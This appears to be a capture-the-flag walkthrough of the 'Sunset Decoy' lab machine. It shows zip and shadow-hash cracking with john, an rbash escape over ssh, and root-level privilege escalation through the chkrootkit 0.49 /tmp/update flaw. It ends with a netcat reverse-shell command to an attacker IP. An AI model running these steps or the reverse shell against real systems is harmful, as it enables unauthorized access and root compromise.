# Sunset Decoy

## Enum

```bash
curl -I 192.168.185.85
HTTP/1.1 200 OK
Date: Fri, 18 Aug 2023 15:55:20 GMT
Server: Apache/2.4.38 (Debian)
Content-Type: text/html;charset=UTF-8
```

There's a link on the webapp to download a zip, it is password protected, but he password is very easy to crack
```bash
zip2john save.zip > hash.txt
ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE ts=90AB cs=90ab type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: TS_chk, cmplen=434, decmplen=1111, crc=E11EC139 ts=834F cs=834f type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: TS_chk, cmplen=460, decmplen=829, crc=A1F81C08 ts=8D07 cs=8d07 type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: TS_chk, cmplen=368, decmplen=669, crc=FF05389F ts=1535 cs=1535 type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: TS_chk, cmplen=140, decmplen=185, crc=DFB905CD ts=8759 cs=8759 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** save.zip/etc/hostname PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=D9C379A9 ts=8CE8 cs=8ce8 type=0
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m*****           (save.zip)
1g 0:00:00:00 DONE (2023-08-18 17:00) 100.0g/s 6553Kp/s 6553Kc/s 6553KC/s 123456..sabrina7
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Unzipping the archive
```bash
unzip save.zip
Archive:  save.zip
[save.zip] etc/passwd password:
  inflating: etc/passwd
  inflating: etc/shadow
  inflating: etc/group
  inflating: etc/sudoers
  inflating: etc/hosts
 extracting: etc/hostname
```

And looking around in the files
```bash
cat hosts
127.0.0.1       localhost
127.0.1.1       decoy

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

```bash
cat hostname
60832e9f188106ec5bcc4eb7709ce592
```

```bash
root:x:0:0:root:/root:/bin/bash
296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash
```

## Hash Cracking 

```bash
grep -v '^#\|^$' sudoers
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
```

```bash
tail -1 shadow
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::
```

Be the bcrypt hashes for root and for another user, the later can be cracked, again because that's a very simple password
```bash
cat hash.txt
$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (?)
1g 0:00:00:04 DONE (2023-08-18 17:07) 0.2028g/s 3531p/s 3531c/s 3531C/s felton..petey
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Escaping rbash

When sshing with that password we get in a restricted shell, which apparently can simply be escaped by running `-t "bash --noprofile"`
```
ssh 296640a3b825115a47b68fc44501c828@192.168.185.85 -t "bash --noprofile"
296640a3b825115a47b68fc44501c828@192.168.185.85's password:
bash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd ../
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/home$
```

```bash
/bin/cat local.txt
3*******************************
```

there's that honeypot binary in the user home dir, after taking a quick look in ghidra, it does a bunch of different things, runs cal, run date, runs vim which could have been interesting if we had a way to run is as root, but we don't, it also has an option that touches a files in /tmp and says that an anti virus is gonna be ran soon. So we touch the file and setup pspy64 to look at what exactly happens:
```bash
2023/08/18 12:55:42 CMD: UID=1000 PID=30431  | ./honeypot.decoy
2023/08/18 12:55:42 CMD: UID=1000 PID=30432  | sh -c /usr/bin/touch /dev/shm/STTY5246
2023/08/18 12:56:01 CMD: UID=0    PID=30433  | /usr/sbin/CRON -f
2023/08/18 12:56:01 CMD: UID=0    PID=30434  | /usr/sbin/CRON -f
2023/08/18 12:56:01 CMD: UID=0    PID=30435  | /bin/sh -c /bin/bash /root/script.sh
2023/08/18 12:56:01 CMD: UID=0    PID=30436  | /bin/bash /root/script.sh
2023/08/18 12:56:01 CMD: UID=0    PID=30439  | /bin/sh /root/chkrootkit-0.49/chkrootkit
2023/08/18 12:56:01 CMD: UID=0    PID=30438  | /bin/sh /root/chkrootkit-0.49/chkrootkit
2023/08/18 12:56:01 CMD: UID=0    PID=30437  | /bin/sh /root/chkrootkit-0.49/chkrootkit
```

## Chrootkit 0.49 exploit

[https://www.exploit-db.com/exploits/33899](https://www.exploit-db.com/exploits/33899)  

From there, things a pretty straightforward
```bash
/bin/cat /tmp/update
/bin/nc 192.168.45.227 4242 -e /bin/sh
```
